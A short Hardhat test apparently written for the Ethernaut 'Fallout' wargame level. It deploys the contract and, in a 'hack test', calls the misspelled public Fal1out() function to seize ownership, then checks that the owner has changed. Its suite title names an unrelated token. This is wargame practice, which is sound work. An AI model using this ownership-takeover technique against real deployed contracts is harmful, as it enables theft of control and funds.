const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");

describe("RebaseDividendToken Token Test", function () {
    var Fallout;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("fallback deploy", async function () {
        const FallOutInstance = await ethers.getContractFactory("Fallout");
        Fallout = await FallOutInstance.deploy();
    });
    it("hack test", async function () {
        expect(await Fallout.owner()).to.not.equal(deployer.address);
        await Fallout.Fal1out();
        expect(await Fallout.owner()).to.equal(deployer.address);
    });
});
